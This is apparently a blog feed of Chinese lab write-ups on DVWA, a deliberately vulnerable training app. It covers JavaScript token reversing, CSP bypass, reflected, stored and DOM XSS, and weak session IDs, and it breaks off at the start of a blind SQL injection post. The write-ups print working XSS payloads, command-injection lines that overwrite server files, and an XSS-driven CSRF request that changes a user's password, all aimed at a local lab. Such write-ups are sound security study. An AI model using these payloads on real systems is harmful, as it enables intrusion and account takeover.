if(code\u0026lt;0xd800||code\u0026gt;=0xe000){bytes[index++]=(0xe0|(code\u0026gt;\u0026gt;12));bytes[index++]=(0x80|((code\u0026gt;\u0026gt;6)\u0026amp;0x3f));bytes[index++]=(0x80|(code\u0026amp;0x3f))}else{code=0x10000+(((code\u0026amp;0x3ff)\u0026lt;\u0026lt;10)|(key.charCodeAt(++i)\u0026amp;0x3ff));bytes[index++]=(0xf0|(code\u0026gt;\u0026gt;18));bytes[index++]=(0x80|((code\u0026gt;\u0026gt;12)\u0026amp;0x3f));bytes[index++]=(0x80|((code\u0026gt;\u0026gt;6)\u0026amp;0x3f));bytes[index++]=(0x80|(code\u0026amp;0x3f))}}key=bytes}else{if(type===\u0026#39;object\u0026#39;){if(key===null){throw new Error(ERROR)}else if(ARRAY_BUFFER\u0026amp;\u0026amp;key.constructor===ArrayBuffer){key=new Uint8Array(key)}else if(!Array.isArray(key)){if(!ARRAY_BUFFER||!ArrayBuffer.isView(key)){throw new Error(ERROR)}}}else{throw new Error(ERROR)}}if(key.length\u0026gt;64){key=(new Sha256(is224,true)).update(key).array()}var oKeyPad=[],iKeyPad=[];for(i=0;i\u0026lt;64;++i){var b=key[i]||0;oKeyPad[i]=0x5c^b;iKeyPad[i]=0x36^b}Sha256.call(this,is224,sharedMemory);this.update(iKeyPad);this.oKeyPad=oKeyPad;this.inner=true;this.sharedMemory=sharedMemory}HmacSha256.prototype=new Sha256();HmacSha256.prototype.finalize=function(){Sha256.prototype.finalize.call(this);if(this.inner){this.inner=false;var innerHash=this.array();Sha256.call(this,this.is224,this.sharedMemory);this.update(this.oKeyPad);this.update(innerHash);Sha256.prototype.finalize.call(this)}};var exports=createMethod();exports.sha256=exports;exports.sha224=createMethod(true);exports.sha256.hmac=createHmacMethod();exports.sha224.hmac=createHmacMethod(true);if(COMMON_JS){module.exports=exports}else{root.sha256=exports.sha256;root.sha224=exports.sha224;if(AMD){define(function(){return exports})}}})();function do_something(e){for(var t=\u0026#34;\u0026#34;,n=e.length-1;n\u0026gt;=0;n--)t+=e[n];return t}function token_part_3(t,y=\u0026#34;ZZ\u0026#34;){document.getElementById(\u0026#34;token\u0026#34;).value=sha256(document.getElementById(\u0026#34;token\u0026#34;).value+y)}function token_part_2(e=\u0026#34;YY\u0026#34;){document.getElementById(\u0026#34;token\u0026#34;).value=sha256(e+document.getElementById(\u0026#34;token\u0026#34;).value)}function token_part_1(a,b){document.getElementById(\u0026#34;token\u0026#34;).value=do_something(document.getElementById(\u0026#34;phrase\u0026#34;).value)}document.getElementById(\u0026#34;phrase\u0026#34;).value=\u0026#34;\u0026#34;;setTimeout(function(){token_part_2(\u0026#34;XX\u0026#34;)},300);document.getElementById(\u0026#34;send\u0026#34;).addEventListener(\u0026#34;click\u0026#34;,token_part_3);token_part_1(\u0026#34;ABCD\u0026#34;,44);   美化一下代码再观察。\n第一个立即函数是 SHA256 的实现，忽略。后续内容很清晰：\n1 2 3 4 5 6  document.getElementById(\u0026#34;phrase\u0026#34;).value = \u0026#34;\u0026#34;; setTimeout(function () { token_part_2(\u0026#34;XX\u0026#34;); }, 300); document.getElementById(\u0026#34;send\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, token_part_3); token_part_1(\u0026#34;ABCD\u0026#34;, 44);   按执行顺序排列一下。\n 把phrase置空。 执行token_part_1，此时 token 值是 reverse(phrase)。 延迟执行token_part_2，此时 token 值是 sha256(\u0026quot;YY\u0026quot;+reverse(phrase))。 点击时执行token_part_3，此时 token 值是 sha256(\u0026quot;YY\u0026quot;+sha256(reverse(phrase))+\u0026quot;ZZ\u0026quot;)。  所以我们要做的只有输入success，调用 token_part_1和token_part_2，然后点击按钮。\n1 2  token_part_1() token_part_2(\u0026#39;XX\u0026#39;)   完成。\n总结 前端逆向不是我擅长的领域，不过还好 High 难度的 js 逆向还能应付得过来。\n过程里发现自己有个非常糟糕的问题，粗心大意。此外就是js逆向功底不太行，尝试分析eval里那个函数，发现除了人肉分析就没有什么别的主意了。如果没分析出来就只能寄，分析太慢也没有办法。但是过去看大佬们搞js逆向的时候都有用babel之类的工具，这方面还需要加强。\n以上，结束。\n","date":"2022-04-29T13:54:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-13/","title":"DVWA上手记录-JavaScript"},{"content":"前言 终于，DVWA快要打通关了。OWASP 2021 的 Top 10 里已经看不到 CSP 了。可能是合并到了 Injection 里，XSS也合并到 Injection 里了。一个 Injection 总结各种注入还是挺精辟的。\n直接开干吧。\n原理 CSP 是 Content Security Policy ，一种降低 XSS 攻击面的技术。简单概括下就是一种同源策略的扩展，用以约束 \u0026lt;script src=\u0026quot;...\u0026quot;、\u0026lt;img src=\u0026quot;...\u0026quot; 这样的外部来源。\n比如说，设置 Content-Security-Policy: script-src 'self' 就会约束脚本src必须和当前页面同源。\nContent-Security-Policy 支持的策略非常多，懒得一一列举了，常见的有 default-src 、script-src 这些。\n解题 Low：收集信息 看介绍，直接填一个脚本链接，脚本会被包含进这个页面。尝试启动一个 http 服务器然后填入。\n1  Refused to load the script \u0026#39;http://172.17.0.1:8000/1.js\u0026#39; because it violates the following Content Security Policy directive: \u0026#34;script-src \u0026#39;self\u0026#39; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com\u0026#34;. Note that \u0026#39;script-src-elem\u0026#39; was not explicitly set, so \u0026#39;script-src\u0026#39; is used as a fallback.   设置了script-src策略，注意到策略里允许了 pastebin、hastebin、toptal 这些网站。\nLow：解题 在 hastebin.com 写一句 alert(1) ，保存并取纯文本链接，然后贴到这里。\n成功。\nMedium：收集信息 提示不管写什么都会直接丢到这里，看你能不能弹出个alert。\n尝试写一个\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;，发现出错：\n1  Refused to execute inline script because it violates the following Content Security Policy directive: \u0026#34;script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; \u0026#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=\u0026#39;\u0026#34;. Note that \u0026#39;unsafe-inline\u0026#39; is ignored if either a hash or nonce value is present in the source list.   提示CSP禁止了inline脚本，但后面备注unsafe-inline会在源列表里有hash和nonce的情况下忽略。\nMedium：解题 尝试在 payload 上加上 nonce：\u0026lt;script nonce\u0026gt;alert(1)\u0026lt;/script\u0026gt;，错误不变。\n加上 src，随便选一个真实存在的 js：\u0026lt;script src=\u0026quot;/dvwa/js/dvwaPage.js\u0026quot; nonce\u0026gt;alert(1)\u0026lt;/script\u0026gt;，错误消失。但脚本没有执行。无奈看了下帮助，提示注意 CSP 的 nonce 策略。于是翻了下请求历史，发现 nonce 不变。\n于是修改 payload，nonce 设置为固定值：\u0026lt;script nonce=\u0026quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=\u0026quot;\u0026gt;alert(1)\u0026lt;/script\u0026gt;\n需要注意的是 nonce- 这个前缀不用放到 script 标签的 nonce 里。\nHigh：收集信息 点击Solve the sum后：\n提示是修改指定的页面来运行自己的代码，怪。这要怎么做？没思路了，看一眼帮助，并没有帮助。\n这一次的 Content-Security-Policy是script-src 'self'，点击Solve the sum产生请求jsonp.php?callback=solveSum。返回结果是一个 js 脚本。审阅代码没有包含 jsonp.php 的内容。\n好吧。先试试请求 jsonp.php，改一下callback参数，请求http://localhost:8080/vulnerabilities/csp/source/jsonp.php?alert。结果返回一个空页面，没有js。所以提示还是对的，只能改jsonp.php文件完成High难度。\n改法可以很简单=。=我们先拿命令注入提取出jsonp.php文件，方便下载。\n1  n|cp /var/www/html/vulnerabilities/csp/source/jsonp.php /var/www/html/jsonp.txt   然后访问/jsonp.txt拿到内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;?php header(\u0026#34;Content-Type: application/json; charset=UTF-8\u0026#34;); if (array_key_exists (\u0026#34;callback\u0026#34;, $_GET)) { $callback = $_GET[\u0026#39;callback\u0026#39;]; } else { return \u0026#34;\u0026#34;; } $outp = array (\u0026#34;answer\u0026#34; =\u0026gt; \u0026#34;15\u0026#34;); echo $callback . \u0026#34;(\u0026#34;.json_encode($outp).\u0026#34;)\u0026#34;; ?\u0026gt;  emm，没什么特别的，接着看下前端怎么处理 jsonp.php 返回的内容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  function clickButton() { var s = document.createElement(\u0026#34;script\u0026#34;); s.src = \u0026#34;source/jsonp.php?callback=solveSum\u0026#34;; document.body.appendChild(s); } function solveSum(obj) { if (\u0026#34;answer\u0026#34; in obj) { document.getElementById(\u0026#34;answer\u0026#34;).innerHTML = obj[\u0026#39;answer\u0026#39;]; } } var solve_button = document.getElementById (\u0026#34;solve\u0026#34;); if (solve_button) { solve_button.addEventListener(\u0026#34;click\u0026#34;, function() { clickButton(); }); }   重点来了：\n1 2 3  var s = document.createElement(\u0026#34;script\u0026#34;); s.src = \u0026#34;source/jsonp.php?callback=solveSum\u0026#34;; document.body.appendChild(s);   直接把 jsonp.php 返回的内容当成了 script 标签的内容，也就是在 jsonp.php 返回随便什么东西前端都会执行。\n那下一步就容易了，利用命令注入漏洞注入一个新的 php 标签，并输出 alert。先写一个脚本把脚本编码成printf 接受的8进制转义。\n1 2 3 4 5 6 7  encoded = \u0026#39;\u0026#39; payload = \u0026#39;\u0026lt;?php echo \\\u0026#39;alert(1)\\\u0026#39;; ?\u0026gt;\u0026#39; for c in payload: if c in \u0026#39;()\u0026amp;|-$`;\\\u0026#39;\u0026#39;: encoded += \u0026#39;\\\\0{:o}\u0026#39;.format(ord(c)) else: encoded += c   得到结果之后，变形一下payload：127.0.0.1|printf '\u0026lt;?php echo \\047alert\\0501\\051\\047\\073 ?\u0026gt;'\u0026gt;\u0026gt;/var/www/html/jsonp.txt。执行后检查：\n再真正注入到 jsonp.php 里。127.0.0.1|printf '\u0026lt;?php echo \\047alert\\0501\\051\\047\\073 ?\u0026gt;'\u0026gt;\u0026gt;/var/www/html/vulnerabilities/csp/source/jsonp.php，返回后发现有语法错误。\n是我大意了=。=算了，直接覆盖掉 jsonp.php 完事。127.0.0.1|printf '\u0026lt;?php echo \\047alert\\0501\\051\\047\\073 ?\u0026gt;'\u0026gt;/var/www/html/vulnerabilities/csp/source/jsonp.php\n成功。\n总结 一定要总结的话就是确实有黑客思维这回事。题目并不是真的在考一个固定知识点，虽然是在CSP题，但真正的关键工作是在命令注入完成的，只是观察CSP这个页面的话是什么也干不成的，即使没有 CSP 干瞪着这个页面也干不成，就算有创建script标签设置内容的js也利用不到。\n但抱怨还是有抱怨的。因为我通关DVWA的目的是学习=。=CSP的 High 难度选择用命令注入当突破口，对了解 CSP 本身就没啥用了，命令注入本身可以干的事情就远不止弄死一个 CSP 这么点=。=\n总之，也行吧。多少对 CSP 有点了解了。\n","date":"2022-04-29T12:00:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-12/","title":"DVWA上手记录-CSP BYPASS"},{"content":"前言 还是很简单。\n原理 没过滤就保存到了数据库里，渲染的时候也没做好过滤。\n解题 收集信息 留言板，而且试了下没过滤 \u0026lt;b\u0026gt;，所以基本和反射型没什么区别，大概。\nLow难度 直接插入一个\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;。\nMedium难度 重置下数据库，再试试直接注入\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;。\n发现标签没了。看下源码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  \u0026lt;?php if( isset( $_POST[ \u0026#39;btnSign\u0026#39; ] ) ) { // Get input  $message = trim( $_POST[ \u0026#39;mtxMessage\u0026#39; ] ); $name = trim( $_POST[ \u0026#39;txtName\u0026#39; ] ); // Sanitize message input  $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_real_escape_string($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $message ) : ((trigger_error(\u0026#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026#34;, E_USER_ERROR)) ? \u0026#34;\u0026#34; : \u0026#34;\u0026#34;)); $message = htmlspecialchars( $message ); // Sanitize name input  $name = str_replace( \u0026#39;\u0026lt;script\u0026gt;\u0026#39;, \u0026#39;\u0026#39;, $name ); $name = ((isset($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_real_escape_string($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $name ) : ((trigger_error(\u0026#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026#34;, E_USER_ERROR)) ? \u0026#34;\u0026#34; : \u0026#34;\u0026#34;)); // Update database  $query = \u0026#34;INSERT INTO guestbook ( comment, name ) VALUES ( \u0026#39;$message\u0026#39;, \u0026#39;$name\u0026#39; );\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $query ) or die( \u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . ((is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_error($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39; ); //mysql_close(); } ?\u0026gt;  注意sanitize message input和sanitize name input，使用了两种不同的方法替换掉script标签。一个是strip_tags一个是str_replace。显然str_replace是更弱的方法，我们先过掉str_replace。payload 只需要改一下大小写：\u0026lt;sCript\u0026gt;alert(1)\u0026lt;/sCript\u0026gt;。\n但是尴尬地发现这个 input 标签限制了长度，直接改 HTML 解决。\n好的，成功过了一个。重置数据库后再尝试 bypass 掉 strip_tags。\n函数文档提到：\n Self-closing XHTML tags are ignored and only non-self-closing tags should be used in allowed_tags.\n 而且\n Warning\nThis function should not be used to try to prevent XSS attacks. Use more appropriate functions like htmlspecialchars() or other means depending on the context of the output.\n 所以可以肯定 strip_tags 是挡不住 XSS 的。文档提到会忽略 self-closing XHTML tags，所以用 img 标签试一下。payload改成：\u0026lt;img src=\u0026quot;\u0026quot; onerror=alert(1)/\u0026gt;\n失败。直接谷歌一下怎么 bypass strip_tags。这个链接解释了strip_tags的实现为什么不能防御 XSS ，另一个回答提供了一个 payload：\u0026lt;\u0026lt;a\u0026gt;script\u0026gt;alert(XSS);\u0026lt;\u0026lt;/a\u0026gt;/script\u0026gt;。直接试一试。\n好的，证明并不靠谱。注意到php代码里还做了addslashes，保护比较好了，干脆放弃。继续做 High 难度。\nHigh难度 看代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  \u0026lt;?php if( isset( $_POST[ \u0026#39;btnSign\u0026#39; ] ) ) { // Get input  $message = trim( $_POST[ \u0026#39;mtxMessage\u0026#39; ] ); $name = trim( $_POST[ \u0026#39;txtName\u0026#39; ] ); // Sanitize message input  $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_real_escape_string($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $message ) : ((trigger_error(\u0026#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026#34;, E_USER_ERROR)) ? \u0026#34;\u0026#34; : \u0026#34;\u0026#34;)); $message = htmlspecialchars( $message ); // Sanitize name input  $name = preg_replace( \u0026#39;/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i\u0026#39;, \u0026#39;\u0026#39;, $name ); $name = ((isset($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_real_escape_string($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $name ) : ((trigger_error(\u0026#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026#34;, E_USER_ERROR)) ? \u0026#34;\u0026#34; : \u0026#34;\u0026#34;)); // Update database  $query = \u0026#34;INSERT INTO guestbook ( comment, name ) VALUES ( \u0026#39;$message\u0026#39;, \u0026#39;$name\u0026#39; );\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $query ) or die( \u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . ((is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_error($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39; ); //mysql_close(); } ?\u0026gt;  老样子，直接用img的payload就可以过，不多写了。\nstrip_tags 现在回头研究下 strip_tags 这个函数要怎么 bypass 。首先链接里的问题是11年前提出（大约是2011年）的，提问时的PHP版本是 5.3（见提问者给的链接），所以在 5.x 版本可能 strip_tags 确实会被 \u0026lt;\u0026lt;a\u0026gt;script\u0026gt;alert(XSS);\u0026lt;\u0026lt;/a\u0026gt;/script\u0026gt; 给绕过。但我的DVWA配的环境是 PHP 7 + MySQL 5.7，所以这个问答里给出的 payload 可能是 PHP 7 已经修复了故而没用。\n从 Teh playground 测试的结果看新实现可能是栈方式了，就是\u0026lt;计数+1，后面的全都删掉。因为\u0026lt;一定被x，最多只能留下\u0026gt;，想在 strip_tags 里留下标签大概是做不到了。\n看下帮助手册，也是提到用name字段而不是message字段。现在是没辙了。\n总结 最大的困难是strip_tags，这要放比赛里我就是个寄吧。\n好了不说自己了。XSS三个板块感觉没有多少变化，一个img的payload就能通杀，感觉有点鸡了，缺乏实感，游戏体验略差。\n暂时就这样吧。\n","date":"2022-04-28T17:21:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-11/","title":"DVWA上手记录-存储型XSS"},{"content":"前言 比较简单，快速过。\n原理 服务端把用户提交的内容没有做好过滤就渲染到了网页上。只有后端渲染才存在这个问题，前后端分离前端渲染的情况都是 DOM XSS。\n解题 收集信息 尝试注入一个\u0026lt;b\u0026gt;mike\u0026lt;/b\u0026gt;。\n好，直接开干。\nLow难度 直接插一个 script 就完了。\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\nMedium难度 尝试\u0026lt;b\u0026gt;mike\u0026lt;/b\u0026gt;没有过滤，再试\u0026lt;img src=\u0026quot;\u0026quot; onerror=\u0026quot;alert(1)\u0026quot;/\u0026gt;\n已经成功了，再看下代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  \u0026lt;?php header (\u0026#34;X-XSS-Protection: 0\u0026#34;); // Is there any input? if( array_key_exists( \u0026#34;name\u0026#34;, $_GET ) \u0026amp;\u0026amp; $_GET[ \u0026#39;name\u0026#39; ] != NULL ) { // Get input  $name = str_replace( \u0026#39;\u0026lt;script\u0026gt;\u0026#39;, \u0026#39;\u0026#39;, $_GET[ \u0026#39;name\u0026#39; ] ); // Feedback for end user  echo \u0026#34;\u0026lt;pre\u0026gt;Hello ${name}\u0026lt;/pre\u0026gt;\u0026#34;; } ?\u0026gt;  这个情况bypass的方法很多，大小写或者加个空格、多插一个\u0026lt;script\u0026gt;让服务端替换，都可以。\nHigh难度 试了下\u0026lt;b\u0026gt;mike\u0026lt;/b\u0026gt;依然过了，再试一次\u0026lt;img src=\u0026quot;\u0026quot; onerror=\u0026quot;alert(1)\u0026quot;/\u0026gt;。\n又直接过了，行吧\u0026hellip;感觉有点无聊了。再看下代码里怎么防的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  \u0026lt;?php header (\u0026#34;X-XSS-Protection: 0\u0026#34;); // Is there any input? if( array_key_exists( \u0026#34;name\u0026#34;, $_GET ) \u0026amp;\u0026amp; $_GET[ \u0026#39;name\u0026#39; ] != NULL ) { // Get input  $name = preg_replace( \u0026#39;/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i\u0026#39;, \u0026#39;\u0026#39;, $_GET[ \u0026#39;name\u0026#39; ] ); // Feedback for end user  echo \u0026#34;\u0026lt;pre\u0026gt;Hello ${name}\u0026lt;/pre\u0026gt;\u0026#34;; } ?\u0026gt;  这正则就有点离谱了=。= 如何构造一个能被这个正则替换过之后还有效的东西呢。然后就想到了转义。\n\u0026lt;\u0026amp;#x73\u0026amp;#x63\u0026amp;#x72\u0026amp;#x69\u0026amp;#x70\u0026amp;#x74\u0026gt;alert(1)\u0026lt;/\u0026amp;#x73\u0026amp;#x63\u0026amp;#x72\u0026amp;#x69\u0026amp;#x70\u0026amp;#x74\u0026gt;\n但是不行。想了想没有什么太好的办法，毕竟只要顺序出现\u0026lt;script这些字符就会被淦，而且是整个被淦，在tag中间加tag的办法也行不通。最后想想还是对啊，干嘛非揪着 script 不放。不用\u0026lt;script还是有大把的 payload 可以用。\n想想这个过滤还是挺离谱的，目前见过的XSS过滤方法基本都是替换掉了 \u0026lt;\u0026gt;() 这些字符，反正构造不出函数调用和HTML标签。\n总结 找个更好玩的 XSS 靶场的念头开始增强了。不过多少还有点担心 XSS 漏洞未来会不会退出主流（好像现在就有点退出主流的意思了），学了能不能涨点身价什么的\u0026hellip;想太多。\n没有特别好总结的，利用script或者别的标签执行 js 就完了。\n","date":"2022-04-28T16:29:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-10/","title":"DVWA上手记录-反射型XSS"},{"content":"前言 终于做到了XSS题。先尝试把DOM型XSS做完。\n原理 用JavaScript操作dom的时候没对用户数据做好过滤，导致将用户数据当HTML/JS解释执行。\n解题 Low难度：收集信息 所有值得关注的东西就是这些。\n目标是获取用户的 Cookie。这里就尝试发起一个 CSRF攻击。\nLow难度：解题 两个写入DOM的地方，一个是 + lang +，一个是 decodeURI(lang)。decodeURI更好操作一些，尝试注入一个合法标签，直接写\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;。\n注入成功。\nMedium难度：解题 惊了，看起来js没变化。\n1 2 3 4 5 6 7 8 9 10  if (document.location.href.indexOf(\u0026#34;default=\u0026#34;) \u0026gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\u0026#34;default=\u0026#34;)+8); document.write(\u0026#34;\u0026lt;option value=\u0026#39;\u0026#34; + lang + \u0026#34;\u0026#39;\u0026gt;\u0026#34; + decodeURI(lang) + \u0026#34;\u0026lt;/option\u0026gt;\u0026#34;); document.write(\u0026#34;\u0026lt;option value=\u0026#39;\u0026#39; disabled=\u0026#39;disabled\u0026#39;\u0026gt;----\u0026lt;/option\u0026gt;\u0026#34;); } document.write(\u0026#34;\u0026lt;option value=\u0026#39;English\u0026#39;\u0026gt;English\u0026lt;/option\u0026gt;\u0026#34;); document.write(\u0026#34;\u0026lt;option value=\u0026#39;French\u0026#39;\u0026gt;French\u0026lt;/option\u0026gt;\u0026#34;); document.write(\u0026#34;\u0026lt;option value=\u0026#39;Spanish\u0026#39;\u0026gt;Spanish\u0026lt;/option\u0026gt;\u0026#34;); document.write(\u0026#34;\u0026lt;option value=\u0026#39;German\u0026#39;\u0026gt;German\u0026lt;/option\u0026gt;\u0026#34;);   尝试用Low难度的payload，发现被跳转：\n大概是做了过滤，虽然有网上随便找的一堆 xss payload 但不想无脑试过去。看一眼源码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  \u0026lt;?php // Is there any input? if ( array_key_exists( \u0026#34;default\u0026#34;, $_GET ) \u0026amp;\u0026amp; !is_null ($_GET[ \u0026#39;default\u0026#39; ]) ) { $default = $_GET[\u0026#39;default\u0026#39;]; # Do not allow script tags  if (stripos ($default, \u0026#34;\u0026lt;script\u0026#34;) !== false) { header (\u0026#34;location: ?default=English\u0026#34;); exit; } } ?\u0026gt;  一个很鸡的过滤，stripos忽略大小写所以大小写 bypass 不行，一次 URI 编码也不行。考虑不用 script 标签，直接把 option和select 标签闭合了，然后插一个别的标签比如img。\npayload就改成这样。\n1  \u0026lt;/option\u0026gt;\u0026lt;/select\u0026gt;\u0026lt;img src=\u0026#34;\u0026#34; onerror=alert(1)\u0026gt;   也暴力解开了。\nHigh难度：解题 还是直接试一次刚才的payload，果不其然302了。看看代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  \u0026lt;?php // Is there any input? if ( array_key_exists( \u0026#34;default\u0026#34;, $_GET ) \u0026amp;\u0026amp; !is_null ($_GET[ \u0026#39;default\u0026#39; ]) ) { # White list the allowable languages  switch ($_GET[\u0026#39;default\u0026#39;]) { case \u0026#34;French\u0026#34;: case \u0026#34;English\u0026#34;: case \u0026#34;German\u0026#34;: case \u0026#34;Spanish\u0026#34;: # ok  break; default: header (\u0026#34;location: ?default=English\u0026#34;); exit; } } ?\u0026gt;  白名单？这我有点不懂了。想一想先。\n想 bypass 显然不能等进入 switch，只能在 if 这里就直接过，所以问题就是array_key_exists和is_null这两个函数能不能 bypass 。\n没什么用的分析略，行不通。\n不过还是有办法，可以用 URL 里的 Fragment。（url里的#fragment部分）。因为JS代码里是这么写的：\n1  var lang = document.location.href.substring(document.location.href.indexOf(\u0026#34;default=\u0026#34;)+8);   直接从href里取substring，偏移值是href.indexOf获得，并没有考虑是从 QueryString 还是 Fragment 取值。所以完全可以把原先的payload加上一个#解决问题。\n好吧，我承认看了下帮助，差点钻了php的牛角尖，去硬找方法 bypass 服务端的检查。\nCSRF：解题 主要是解决 Cookies 默认 samesite: lax 导致的 xhr 行不通的问题。\n把 payload 改成下面这样。\n1  \u0026lt;/option\u0026gt;\u0026lt;/select\u0026gt;\u0026lt;img src=\u0026#34;\u0026#34; onerror=\u0026#34;let xhr = new XMLHttpRequest(); xhr.open(\u0026#39;get\u0026#39;, \u0026#39;http://localhost:8080/vulnerabilities/csrf/?password_new=xss\u0026amp;password_conf=xss\u0026amp;Change=Change\u0026#39;); xhr.withCredentials=true; xhr.send();\u0026#34;\u0026gt;   然后验证下修改的密码xss是否有效。\n相应的，提高到 Medium 和 High 难度其实也没有难度了。\nMedium难度的 CSRF 只检查了 Host，XSS 方式发起的 CSRF 攻击无法通过检查同源和Host来解决。但严格检查 Referer 的话还是有可能发现的。\nHigh 难度的 CSRF 添加了 csrf_token，但是 XSS 方式发起攻击完全可以 xhr 请求到表单页面的 HTML，也就可以拿到 token，csrf_token 无法防御。\n总结 这个 XSS 题花样还是有点少，我还是挺期待能把大佬玩出花的 XSS payload 都学一学在什么场景玩，什么原因研发出来的。\n将来有机会应该会找找有没有比较好玩的 XSS 靶场练练手。\n","date":"2022-04-28T15:17:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-09/","title":"DVWA上手记录-DOM型XSS"},{"content":"前言 感觉是比较鸡的问题，快速过一下。\n原理 会话ID规律太明显导致被伪造。比如说直接把会话ID设置成数字的，那就有可能被枚举出别的用户的会话了。\n解题 Low难度 再点一次出现2。这就没啥好解的了。\nMedium难度 递增，这个数字模式看起来有点像 Unix 时间戳：\n 位数不长不短 16 开头 两个id递增的间隔和我映像里操作的时间比较接近  有了怀疑就看一看，转成时间戳后证明了我的猜测。\n剩下就是枚举出可能的用户ID了。枚举的技巧就是从接近现在的时间往回找，离得越远越不可能。区间也可以限制在比较小的范围比如一周或者一个月。\nHigh难度 点击generate之后拿到一个Set-Cookie，观察dvwaSession内容怀疑是某种哈希，直接贴cmd5后发现是数字2。再点击一次后得到数字3。\n所以规律就是1,2,3,4,5...这样的序列了，可以通过md5('1')这样的方式伪造出用户ID为1的用户的会话。\n总结 我觉得应该没人干这种蠢事了。不过确实还是有人用随机数或者随机字节当会话ID的，用的还是math.random而不是crypto.random。我寻思这种虽然可能存在隐患，但要拿到随机种子才有机会利用吧。如果种子选的不好比如0，或者很容易猜出来比如开机时间+一段启动服务的时间偏差，精度秒。那做好随机迭代次数估计（比如1年前的随机种子，你要取头几个随机值肯定是无效的，因为会话有过期时间，根据网站热度可以估计一个大概的范围（已经取了N~M随机数），尝试N+x次的随机数就行）的话，应该还是有机会枚举出来的，我猜。\n好了，WeakSessionID 这题就这样吧。\n","date":"2022-04-28T12:59:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-08/","title":"DVWA上手记录-弱会话ID"},{"content":"前言 SQL盲注会比一般的注入难度高很多，特别是经验不足的时候可以尝试的 payload 有限，就算有注入点也很难靠手里积累的那点 payload 测出来。一般这种时候用工具会好得多。\n原理 SQL盲注指的是存在SQL注入，但SQL错误不回显。这种情况下报错攻击无效而且构造有效的 payload 会比较困难。但还是可以通过几个方面确定执行结果：\n 页面显示内容。比如当SQL错误发生或WHERE、ON这样的条件子句不满足时和正常执行时网页内容不同。 如果正常执行和错误都返回一样的页面，还可以通过时间来判断SQL是否被执行，比如构造一个执行很慢的 payload 让 SQL 服务器跑，如果返回时间比正常时间久就说明SQL被执行了。 可能还有其他的？  盲注还有个问题就是注入的查询可能不回显到前端，所以直接 UNION 一个查询曝出所有的表和列是不太可能的。但如果存在盲注的话至少会有一个比特的观测窗口，所以还是存在一个字符一个字符试过去的办法，比如表名第一个字符是a的表是否存在，表名第一个字符是b的表是否存在，如此如此。虽然慢而且对一些无法枚举的字段（比如存的是unicode，那总不能遍历整个码表；或者 int、float这样取值范围太大的类型）没辙。\n解题 Low难度：收集信息 